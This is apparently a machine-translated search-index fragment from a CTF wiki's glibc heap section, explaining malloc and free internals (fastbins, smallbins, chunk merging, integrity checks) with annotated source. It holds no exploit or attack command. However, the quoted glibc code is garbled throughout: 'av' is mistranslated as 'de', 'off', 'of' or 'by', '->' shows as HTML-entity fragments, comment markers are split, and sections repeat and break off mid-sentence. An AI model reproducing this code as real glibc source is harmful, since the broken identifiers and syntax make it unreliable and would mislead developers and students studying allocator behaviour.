(( action & do_backtrace )) BEFORE_ABORT ( do_abort , written , fd ); /* Kill the application. */ abortion (); } In the abort function, flibsh stream will be used when glibc is still 2.23. /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if ( stage == 1 ) { ++ stage ; fflush ( NULL ); }","title":"malloc_printerr"},{"location":"pwn/linux/glibc-heap/implementation/free/","text":"release memory block \u00b6 __libc_free \u00b6 Similar to malloc, the free function also has a wrapper, and the naming format is basically similar to malloc. code show as below void __libc_free ( void * mem ) { mstate ar_ptr ; mchunkptr p ; /* chunk corresponding to mem */ / / Determine whether there is a hook function __free_hook void ( * hook )( void * , const void * ) = atomic_forced_read ( __free_hook ); if ( __builtin_expect ( hook != NULL , 0 )) { ( * hook )( mem , RETURN_ADDRESS ( 0 )); return ; } // free NULL has no effect if ( mem == 0 ) /* free(0) has no effect */ return ; / / Convert mem to chunk state p = mem2chunk ( mem ); // If the block memory is obtained by mmap if ( chunk_is_mmapped ( p )) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if ( ! mp_ . no_dyn_threshold && chunksize_nomask ( p ) > mp_ . mmap_threshold && chunksize_nomask ( p ) <= DEFAULT_MMAP_THRESHOLD_MAX && ! DUMPED_MAIN_ARENA_CHUNK ( p )) { mp_ . mmap_threshold = chunksize ( p ); mp_ . trim_threshold = 2 * mp_ . mmap_threshold ; LIBC_PROBE ( memory_mallopt_free_dyn_thresholds , 2 , mp_ . mmap_threshold , mp_ . trim_threshold ); } munmap_chunk ( p ); return ; } // Get a pointer to the allocation area according to the chunk ar_ptr = arena_for_chunk ( p ); // execute release _int_free ( ar_ptr , p , 0 ); } _int_free \u00b6 The initial time of the function defines a series of variables and gets the size of the chunk the user wants to release. static void _int_free ( mstate av , mchunkptr p , int have_lock ) { INTERNAL_SIZE_T size ; /* its size */ mfastbinptr * fb ; /* associated fastbin */ mchunkptr nextchunk ; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize ; /* its size */ int nextinuse ; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize ; /* size of previous contiguous chunk */ mchunkptr bck ; /* misc temp for linking */ mchunkptr fwd ; /* misc temp for linking */ const char * errstr = NULL ; int locked = 0 ; size = chunksize ( p ); Simple check \u00b6 /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ // The pointer cannot point to an illegal address, it must be less than or equal to -size, why? ? ? // The pointer must be aligned, 2*SIZE_SZ This alignment is carefully thought about if ( __builtin_expect (( uintptr_t ) p > ( uintptr_t ) - size , 0 ) || __builtin_expect ( misaligned_chunk ( p ), 0 )) { errstr = \"free(): invalid pointer\" ; errout : if ( ! have_lock && locked ) __libc_lock_unlock ( av -> mutex ); malloc_printerr ( check_action , errstr , chunk2mem ( p ), av ); return ; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // The size is not the smallest chunk, or the size is not an integer multiple of MALLOC_ALIGNMENT if ( __glibc_unlikely ( size < MINSIZE || ! aligned_OK ( size ))) { errstr = \"free(): invalid size\" ; goto errout ; } / / Check if the chunk is in use , no effect in the non - debug state check_inuse_chunk ( av , p ); among them /* Check if m has acceptable alignment */ #define aligned_OK(m) (((unsigned long) (m) &MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ (( uintptr_t )( MALLOC_ALIGNMENT == 2 * SIZE_SZ ? ( p ) : chunk2mem ( p )) & \\ MALLOC_ALIGN_MASK ) I am almost If the above checks are all qualified, it is judged whether the current bin is in the fast bin range, and if it is inserted into the fastbin header , it becomes the first free chunk** corresponding to the fastbin list. /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if (( unsigned long ) ( size ) <= ( unsigned long ) ( get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ //Default #define TRIM_FASTBINS 0, so the following statement will not execute by default // If the current chunk is a fast chunk and the next chunk is a top chunk, it cannot be inserted && ( chunk_at_offset ( p , size ) != av -> top ) #endif ) { // The size of the next chunk cannot be less than twice the SIZE_SZ, and // The size of the next chunk cannot be greater than system_mem, which is generally 132k // If this happens, an error is reported. if ( __builtin_expect ( chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem , 0 )) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if ( have_lock || ({ assert ( locked == 0 ); __libc_lock_lock ( de -& gt ; mutex ); locked = 1 ; chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ || chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem ; })) { errstr = \"free(): invalid next size (fast)\" ; goto errout ; } if ( ! have_lock ) { __libc_lock_unlock ( de -& gt ; mutex ); locked = 0 ; } } // Set the mem part of the chunk to perturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ ); / / Set the flag bit of the fast chunk set_fastchunks ( of ); / / Get the index of the fast bin according to the size unsigned int idx = fastbin_index ( size ); // Get the head pointer corresponding to fastbin, which is NULL after being initialized. fb = & amp ; fastbin ( av , idx ); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ // Insert P into the linked list using atomic operations mchunkptr old = * fb , old2 ; unsigned int old_idx = ~ 0u ; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // so we can not double free one fastbin chunk // prevent against fast bin double free if ( __builtin_expect ( old == p , 0 )) { errstr = \"double free or corruption (fasttop)\" ; goto errout ; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if ( have_lock && old != NULL ) old_idx = fastbin_index ( chunksize ( old )); p -> fd = old2 = old ; } while (( old = catomic_compare_and_exchange_val_rel ( fb , p , old2 )) != old2 ); // Make sure the fast bin is added before and after joining if ( have_lock && old != NULL && __builtin_expect ( old_idx != idx , 0 )) { errstr = \"invalid fastbin entry (free)\" ; goto errout ; } } Merging non-mmap free chunks \u00b6 Unlink will only be triggered if it is not a fast bin First, let's talk about why the chunks are merged. This is to avoid too many fragmented memory blocks in the heap. After the merge, it can be used to handle larger memory block requests. The main order of the merge is Consider the physical low address free block first After considering the physical high address free block The merged chunk points to the lower address of the merged chunk. In the absence of a lock, the lock is first obtained. /* Consolidate other non-mmapped chunks as they arrive. */ else if ( ! chunk_is_mmapped ( p )) { if ( ! have_lock ) { __libc_lock_lock ( de -& gt ; mutex ); locked = 1 ; } nextchunk = chunk_at_offset ( p , size ); Lightweight inspection \u00b6 /* Lightweight tests: check whether the block is already the top block. */ // The current free chunk cannot be the top chunk if ( __glibc_unlikely ( p == av -> top )) { errstr = \"double free or corruption (top)\" ; goto errout ; } // The next chunk of the current free chunk cannot exceed the bound of arena /* Or whether the next chunk is beyond the boundaries of the arena. */ if ( __builtin_expect ( contiguous ( av ) && ( char * ) nextchunk >= (( char * ) off -& gt ; top + chunksize ( off -& gt ; top )), 0 )) { errstr = \"double free or corruption (out)\" ; goto errout ; } // The currently used chunk&#39;s usage tag is not marked, double free /* Or whether the block is actually not marked used. */ if ( __glibc_unlikely ( ! prev_inuse ( nextchunk ))) { errstr = \"double free or corruption (!prev)\" ; goto errout ; } // the size of the next chunk nextsize = chunksize ( nextchunk ); // next chunk size valid check / / Determine whether the size of the next chunk is not greater than 2 * SIZE_SZ , or // Whether nextsize is greater than the memory available in the system if ( __builtin_expect ( chunksize_nomask ( nextchunk ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( nextsize >= av -> system_mem , 0 )) { errstr = \"free(): invalid next size (normal)\" ; goto errout ; } Release padding \u00b6 / / Set the mem part of the pointer to perturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ ); Backward merge-merge low address chunk \u00b6 /* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( off , p , bck , fwd ); } The next block is not a top chunk - forward merge - merge high address chunk \u00b6 It should be noted that if the next block is not the top chunk, merge the chunks with the high address and put the merged chunk into the unsorted bin. // If the next chunk is not the top chunk if ( nextchunk != av -> top ) { /* get and clear inuse bit */ / / Get the use status of the next chunk nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); // If not used, merge, otherwise clear the current chunk usage status. /* consolidate forward */ if ( ! nextinuse ) { unlink ( av , nextchunk , bck , fwd ); size += nextsize ; } else clear_inuse_bit_at_offset ( nextchunk , 0 ); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ // put the chunk in the head of the unsorted chunk list bck = unsorted_chunks ( off ); fwd = bck -> fd ; // Simple check if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"free(): corrupted unsorted chunks\" ; goto errout ; } p -> fd = fwd ; p -> bk = bck ; // If it is a large chunk, set the nextsize pointer field to NULL. if ( ! in_smallbin_range ( size )) { p -> fd_nextsize = NULL ; p -> bk_nextsize = NULL ; } bck -> fd = p ; fwd -> bk = p ; set_head ( p , size | PREV_INUSE ); set_foot ( p , size ); check_free_chunk ( av , p ); } The next block is the top chunk- merged into the top chunk \u00b6 /* If the chunk borders the current high end of memory, consolidate into top */ // If the next chunk of the chunk to be released is the top chunk, merge it into the top chunk else { size += nextsize ; set_head ( p , size | PREV_INUSE ); of -& gt ; top = p ; check_chunk ( av , p ); } Returning memory to the system \u00b6 /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ // If the size of the merged chunk is greater than FASTBIN_CONSOLIDATION_THRESHOLD // Normally merged into the top chunk will execute this part of the code. // Then return the memory to the system if (( unsigned long ) ( size ) >= FASTBIN_CONSOLIDATION_THRESHOLD ) { // merge if there is a fast chunk if ( have_fastchunks ( off )) malloc_consolidate ( off ); // main allocation area if ( by == & amp ; main_arena ) { #ifndef MORECORE_CANNOT_TRIM // top chunk is greater than the current contraction threshold if (( unsigned long ) ( chunksize ( av -> top )) >= ( unsigned long ) ( mp_ . trim_threshold )) systrim ( mp_ . top_pad , off ); #endif // Non-primary allocation area, directly shrinking heap } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info * heap = heap_for_ptr ( top ( off )); assert ( heap -& gt ; ar_ptr == off ); heap_trim ( heap , mp_ . top_pad ); } } if ( ! have_lock ) { assert ( locked ); __libc_lock_unlock ( de -& gt ; mutex ); } Release the chunk of mmap \u00b6 } else { // If the chunk was allocated via mmap, release via munmap(). munmap_chunk ( p ); } systrim \u00b6 heap_trim \u00b6 munmap_chunk \u00b6","title":"Free Heap Memory"},{"location":"pwn/linux/glibc-heap/implementation/free/#release-memory-block","text":"","title":"release memory block"},{"location":"pwn/linux/glibc-heap/implementation/free/#__libc_free","text":"Similar to malloc, the free function also has a wrapper, and the naming format is basically similar to malloc. code show as below void __libc_free ( void * mem ) { mstate ar_ptr ; mchunkptr p ; /* chunk corresponding to mem */ / / Determine whether there is a hook function __free_hook void ( * hook )( void * , const void * ) = atomic_forced_read ( __free_hook ); if ( __builtin_expect ( hook != NULL , 0 )) { ( * hook )( mem , RETURN_ADDRESS ( 0 )); return ; } // free NULL has no effect if ( mem == 0 ) /* free(0) has no effect */ return ; / / Convert mem to chunk state p = mem2chunk ( mem ); // If the block memory is obtained by mmap if ( chunk_is_mmapped ( p )) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if ( ! mp_ . no_dyn_threshold && chunksize_nomask ( p ) > mp_ . mmap_threshold && chunksize_nomask ( p ) <= DEFAULT_MMAP_THRESHOLD_MAX && ! DUMPED_MAIN_ARENA_CHUNK ( p )) { mp_ . mmap_threshold = chunksize ( p ); mp_ . trim_threshold = 2 * mp_ . mmap_threshold ; LIBC_PROBE ( memory_mallopt_free_dyn_thresholds , 2 , mp_ . mmap_threshold , mp_ . trim_threshold ); } munmap_chunk ( p ); return ; } // Get a pointer to the allocation area according to the chunk ar_ptr = arena_for_chunk ( p ); // execute release _int_free ( ar_ptr , p , 0 ); }","title":"__libc_free"},{"location":"pwn/linux/glibc-heap/implementation/free/#_int_free","text":"The initial time of the function defines a series of variables and gets the size of the chunk the user wants to release. static void _int_free ( mstate av , mchunkptr p , int have_lock ) { INTERNAL_SIZE_T size ; /* its size */ mfastbinptr * fb ; /* associated fastbin */ mchunkptr nextchunk ; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize ; /* its size */ int nextinuse ; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize ; /* size of previous contiguous chunk */ mchunkptr bck ; /* misc temp for linking */ mchunkptr fwd ; /* misc temp for linking */ const char * errstr = NULL ; int locked = 0 ; size = chunksize ( p );","title":"_int_free"},{"location":"pwn/linux/glibc-heap/implementation/free/#simple-check","text":"/* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ // The pointer cannot point to an illegal address, it must be less than or equal to -size, why? ? ? // The pointer must be aligned, 2*SIZE_SZ This alignment is carefully thought about if ( __builtin_expect (( uintptr_t ) p > ( uintptr_t ) - size , 0 ) || __builtin_expect ( misaligned_chunk ( p ), 0 )) { errstr = \"free(): invalid pointer\" ; errout : if ( ! have_lock && locked ) __libc_lock_unlock ( av -> mutex ); malloc_printerr ( check_action , errstr , chunk2mem ( p ), av ); return ; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // The size is not the smallest chunk, or the size is not an integer multiple of MALLOC_ALIGNMENT if ( __glibc_unlikely ( size < MINSIZE || ! aligned_OK ( size ))) { errstr = \"free(): invalid size\" ; goto errout ; } / / Check if the chunk is in use , no effect in the non - debug state check_inuse_chunk ( av , p ); among them /* Check if m has acceptable alignment */ #define aligned_OK(m) (((unsigned long) (m) &MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ (( uintptr_t )( MALLOC_ALIGNMENT == 2 * SIZE_SZ ? ( p ) : chunk2mem ( p )) & \\ MALLOC_ALIGN_MASK ) I am almost If the above checks are all qualified, it is judged whether the current bin is in the fast bin range, and if it is inserted into the fastbin header , it becomes the first free chunk** corresponding to the fastbin list. /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if (( unsigned long ) ( size ) <= ( unsigned long ) ( get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ //Default #define TRIM_FASTBINS 0, so the following statement will not execute by default // If the current chunk is a fast chunk and the next chunk is a top chunk, it cannot be inserted && ( chunk_at_offset ( p , size ) != av -> top ) #endif ) { // The size of the next chunk cannot be less than twice the SIZE_SZ, and // The size of the next chunk cannot be greater than system_mem, which is generally 132k // If this happens, an error is reported. if ( __builtin_expect ( chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem , 0 )) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if ( have_lock || ({ assert ( locked == 0 ); __libc_lock_lock ( de -& gt ; mutex ); locked = 1 ; chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ || chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem ; })) { errstr = \"free(): invalid next size (fast)\" ; goto errout ; } if ( ! have_lock ) { __libc_lock_unlock ( de -& gt ; mutex ); locked = 0 ; } } // Set the mem part of the chunk to perturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ ); / / Set the flag bit of the fast chunk set_fastchunks ( of ); / / Get the index of the fast bin according to the size unsigned int idx = fastbin_index ( size ); // Get the head pointer corresponding to fastbin, which is NULL after being initialized. fb = & amp ; fastbin ( av , idx ); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ // Insert P into the linked list using atomic operations mchunkptr old = * fb , old2 ; unsigned int old_idx = ~ 0u ; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // so we can not double free one fastbin chunk // prevent against fast bin double free if ( __builtin_expect ( old == p , 0 )) { errstr = \"double free or corruption (fasttop)\" ; goto errout ; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if ( have_lock && old != NULL ) old_idx = fastbin_index ( chunksize ( old )); p -> fd = old2 = old ; } while (( old = catomic_compare_and_exchange_val_rel ( fb , p , old2 )) != old2 ); // Make sure the fast bin is added before and after joining if ( have_lock && old != NULL && __builtin_expect ( old_idx != idx , 0 )) { errstr = \"invalid fastbin entry (free)\" ; goto errout ; } }","title":"Simple check"},{"location":"pwn/linux/glibc-heap/implementation/free/#merging-non-mmap-free-chunks","text":"Unlink will only be triggered if it is not a fast bin First, let's talk about why the chunks are merged. This is to avoid too many fragmented memory blocks in the heap. After the merge, it can be used to handle larger memory block requests. The main order of the merge is Consider the physical low address free block first After considering the physical high address free block The merged chunk points to the lower address of the merged chunk. In the absence of a lock, the lock is first obtained. /* Consolidate other non-mmapped chunks as they arrive. */ else if ( ! chunk_is_mmapped ( p )) { if ( ! have_lock ) { __libc_lock_lock ( de -& gt ; mutex ); locked = 1 ; } nextchunk = chunk_at_offset ( p , size );","title":"Merging non-mmap free chunks"},{"location":"pwn/linux/glibc-heap/implementation/free/#lightweight-inspection","text":"/* Lightweight tests: check whether the block is already the top block. */ // The current free chunk cannot be the top chunk if ( __glibc_unlikely ( p == av -> top )) { errstr = \"double free or corruption (top)\" ; goto errout ; } // The next chunk of the current free chunk cannot exceed the bound of arena /* Or whether the next chunk is beyond the boundaries of the arena. */ if ( __builtin_expect ( contiguous ( av ) && ( char * ) nextchunk >= (( char * ) off -& gt ; top + chunksize ( off -& gt ; top )), 0 )) { errstr = \"double free or corruption (out)\" ; goto errout ; } // The currently used chunk&#39;s usage tag is not marked, double free /* Or whether the block is actually not marked used. */ if ( __glibc_unlikely ( ! prev_inuse ( nextchunk ))) { errstr = \"double free or corruption (!prev)\" ; goto errout ; } // the size of the next chunk nextsize = chunksize ( nextchunk ); // next chunk size valid check / / Determine whether the size of the next chunk is not greater than 2 * SIZE_SZ , or // Whether nextsize is greater than the memory available in the system if ( __builtin_expect ( chunksize_nomask ( nextchunk ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( nextsize >= av -> system_mem , 0 )) { errstr = \"free(): invalid next size (normal)\" ; goto errout ; }","title":"Lightweight inspection"},{"location":"pwn/linux/glibc-heap/implementation/free/#release-padding","text":"/ / Set the mem part of the pointer to perturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ );","title":"Release padding"},{"location":"pwn/linux/glibc-heap/implementation/free/#backward-merge-merge-low-address-chunk","text":"/* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( off , p , bck , fwd ); }","title":"Backward merge-merge low address chunk"},{"location":"pwn/linux/glibc-heap/implementation/free/#the-next-block-is-not-a-top-chunk-forward-merge-merge-high-address-chunk","text":"It should be noted that if the next block is not the top chunk, merge the chunks with the high address and put the merged chunk into the unsorted bin. // If the next chunk is not the top chunk if ( nextchunk != av -> top ) { /* get and clear inuse bit */ / / Get the use status of the next chunk nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); // If not used, merge, otherwise clear the current chunk usage status. /* consolidate forward */ if ( ! nextinuse ) { unlink ( av , nextchunk , bck , fwd ); size += nextsize ; } else clear_inuse_bit_at_offset ( nextchunk , 0 ); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ // put the chunk in the head of the unsorted chunk list bck = unsorted_chunks ( off ); fwd = bck -> fd ; // Simple check if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"free(): corrupted unsorted chunks\" ; goto errout ; } p -> fd = fwd ; p -> bk = bck ; // If it is a large chunk, set the nextsize pointer field to NULL. if ( ! in_smallbin_range ( size )) { p -> fd_nextsize = NULL ; p -> bk_nextsize = NULL ; } bck -> fd = p ; fwd -> bk = p ; set_head ( p , size | PREV_INUSE ); set_foot ( p , size ); check_free_chunk ( av , p ); }","title":"The next block is not a top chunk - forward merge - merge high address chunk"},{"location":"pwn/linux/glibc-heap/implementation/free/#the-next-block-is-the-top-chunk-merged-into-the-top-chunk","text":"/* If the chunk borders the current high end of memory, consolidate into top */ // If the next chunk of the chunk to be released is the top chunk, merge it into the top chunk else { size += nextsize ; set_head ( p , size | PREV_INUSE ); of -& gt ; top = p ; check_chunk ( av , p ); }","title":"The next block is the top chunk- merged into the top chunk"},{"location":"pwn/linux/glibc-heap/implementation/free/#returning-memory-to-the-system","text":"/* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ // If the size of the merged chunk is greater than FASTBIN_CONSOLIDATION_THRESHOLD // Normally merged into the top chunk will execute this part of the code. // Then return the memory to the system if (( unsigned long ) ( size ) >= FASTBIN_CONSOLIDATION_THRESHOLD ) { // merge if there is a fast chunk if ( have_fastchunks ( off )) malloc_consolidate ( off ); // main allocation area if ( by == & amp ; main_arena ) { #ifndef MORECORE_CANNOT_TRIM // top chunk is greater than the current contraction threshold if (( unsigned long ) ( chunksize ( av -> top )) >= ( unsigned long ) ( mp_ . trim_threshold )) systrim ( mp_ . top_pad , off ); #endif // Non-primary allocation area, directly shrinking heap } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info * heap = heap_for_ptr ( top ( off )); assert ( heap -& gt ; ar_ptr == off ); heap_trim ( heap , mp_ . top_pad ); } } if ( ! have_lock ) { assert ( locked ); __libc_lock_unlock ( de -& gt ; mutex ); }","title":"Returning memory to the system"},{"location":"pwn/linux/glibc-heap/implementation/free/#release-the-chunk-of-mmap","text":"} else { // If the chunk was allocated via mmap, release via munmap(). munmap_chunk ( p ); }","title":"Release the chunk of mmap"},{"location":"pwn/linux/glibc-heap/implementation/free/#systrim","text":"","title":"systrim"},{"location":"pwn/linux/glibc-heap/implementation/free/#heap_trim","text":"","title":"heap_trim"},{"location":"pwn/linux/glibc-heap/implementation/free/#munmap_chunk","text":"","title":"munmap_chunk"},{"location":"pwn/linux/glibc-heap/implementation/heap-init/","text":"\u5806 initialization \u00b6 The heap initialization is performed by executing malloc_consolidate and then executing malloc_init_state when the user first requests memory. I won\u2019t explain too much here. See the malloc_state correlation function.","title":"Heap Initialization"},{"location":"pwn/linux/glibc-heap/implementation/heap-init/#initialization","text":"The heap initialization is performed by executing malloc_consolidate and then executing malloc_init_state when the user first requests memory. I won\u2019t explain too much here. See the malloc_state correlation function.","title":"\u5806 initialization"},{"location":"pwn/linux/glibc-heap/implementation/malloc/","text":"Apply for a memory block \u00b6 __libc_malloc \u00b6 In general, we will use the malloc function to apply for a block of memory, but when we look closely at the source implementation of glibc, there is actually no malloc function. In fact, the function actually calls the __libc_malloc function. Why not just write a malloc function directly, because sometimes we may need different names. In addition, the __libc_malloc function is simply used to simply wrap the _int_malloc function. _int_malloc is the core of the application memory block. Let's take a closer look at the specific implementation. This function first checks if there is a hook function (__malloc_hook) for the memory allocation function. This is mainly used for user-defined heap allocation functions, which is convenient for users to quickly modify and evaluate the allocation function. It should be noted here that the user-applied byte becomes an unsigned integer once it enters the application memory function. // wapper for int_malloc void * __libc_malloc ( size_t bytes ) { mstate ar_ptr ; void * victim ; // Check if there is a memory allocation hook, if so, call the hook and return. void * ( * hook )( size_t , const void * ) = atomic_forced_read ( __malloc_hook ); if ( __builtin_expect ( hook != NULL , 0 )) return ( * hook )( bytes , RETURN_ADDRESS ( 0 )); Then I will look for an arena to try to allocate memory. arena_get ( ar_ptr , bytes ); Then call the _int_malloc function to request the corresponding memory. victim = _int_malloc ( ar_ptr , bytes ); If the allocation fails, ptmalloc will try to find another available arena and allocate memory. /* Retry with another arena only if we were able to find a usable arena before. */ if ( ! victim && ar_ptr != NULL ) { LIBC_PROBE ( memory_malloc_retry , 1 , bytes ); ar_ptr = arena_get_retry ( ar_ptr , bytes ); victim = _int_malloc ( ar_ptr , bytes ); } If you apply for arena, you have to unlock it before you quit. if ( ar_ptr != NULL ) __libc_lock_unlock ( ar_ptr -> mutex ); Determine if the current status meets the following conditions Either didn't apply to memory either mmap memory Either the requested memory must be in its assigned arena assert ( ! victim || chunk_is_mmapped ( mem2chunk ( victim )) || ar_ptr == arena_for_chunk ( mem2chunk ( victim ))); Finally return to memory. return victim ; } _int_malloc \u00b6 _int_malloc is the core function of memory allocation, and its core ideas are as follows It implements different allocation methods in turn according to the memory block size and frequency of use of fastbin chunk, small chunk, large chunk of the user's application. It checks from small to large whether there are corresponding free blocks in different bins to satisfy the memory requested by the user. When all free chunks are not met, it considers the top chunk. The heap allocator will only request the memory block when the top chunk is not satisfied. After entering the function, the function immediately defines a series of variables that you need, and converts the memory size requested by the user to the internal chunk size. static void * _int_malloc ( mstate av , size_t bytes ) { INTERNAL_SIZE_T nb ; /* normalized request size */ unsigned int idx ; /* associated bin index */ mbinptr bin ; /* associated bin */ mchunkptr victim ; /* inspected/selected chunk */ INTERNAL_SIZE_T size ; /* its size */ int victim_index ; /* its bin index */ mchunkptr remainder ; /* remainder from a split */ unsigned long remainder_size ; /* its size */ unsigned int block ; /* bit map traverser */ unsigned int bit ; /* bit map traverser */ unsigned int map ; /* current word of binmap */ mchunkptr fwd ; /* misc temp for linking */ mchunkptr bck ; /* misc temp for linking */ const char * errstr = NULL ; /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size ( bytes , nb ); arena \u00b6 /* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ if ( __glibc_unlikely ( av == NULL )) { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; } fast bin \u00b6 If the size of the requested chunk is in the fastbin range, note that the comparison here is an unsigned integer . In addition, chunk is taken from the head node of fastbin. /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if (( unsigned long ) ( nb ) <= ( unsigned long ) ( get_max_fast ())) { // Get the corresponding subscript of fastbin idx = fastbin_index ( nb ); // Get the corresponding pointer to the fastbin mfastbinptr * fb = & fastbin ( av , idx ); mchunkptr pp = * fb ; // Use fd to traverse the corresponding bin whether there are free chunks, do { victim = pp ; if ( victim == NULL ) break ; } while (( pp = catomic_compare_and_exchange_val_acq ( fb , victim -> fd , victim )) != victim ); // There are chunks that can be used if ( victim != 0 ) { // Check if the chunk size retrieved is consistent with the corresponding fastbin index. // Calculate its size using chunksize based on the obtained victim. // Calculate the index of the chunk using fastbin_index. if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim ), av ); return NULL ; } // Careful inspection. . Useful only when DEBUG check_remalloced_chunk ( av , victim , nb ); // Convert the obtained chunk to mem mode void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } small bin \u00b6 If the range of the obtained memory block is in the range of the small bin, then the following process is performed. /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // Get the index of the small bin idx = smallbin_index ( nb ); // Get the corresponding chunk pointer in the small bin bin = bin_at ( av , idx ); // first execute victim = last(bin) to get the last chunk of the small bin // If victim = bin , then the bin is empty. // If they are not equal, then there will be two cases if (( victim = last ( bin )) != bin ) { // In the first case, the small bin has not yet been initialized. if ( victim == 0 ) /* initialization check */ // Perform initialization to merge chunks in fast bins malloc_consolidate ( av ); // In the second case, there is a free chunk in the small bin else { // Get the second-to-last chunk in the small bin. bck = victim -> bk ; // Check if bck->fd is victim, prevent forgery if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // Set the corresponding inuse bit of victim set_inuse_bit_at_offset ( victim , nb ); // Modify the small bin list, take the last chunk of the small bin bin -> bk = bck ; bck -> fd = bin ; // If it is not main_arena, set the corresponding flag if ( av != & main_arena ) set_non_main_arena ( victim ); // Detailed inspection, non-debug status has no effect check_malloced_chunk ( av , victim , nb ); // Convert the requested chunk to the corresponding mem state void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } } large bin \u00b6 When the chunks in the fast bin and small bin cannot satisfy the user request chunk hour, it will consider whether it is a large bin. However, in the large bin, there is no direct 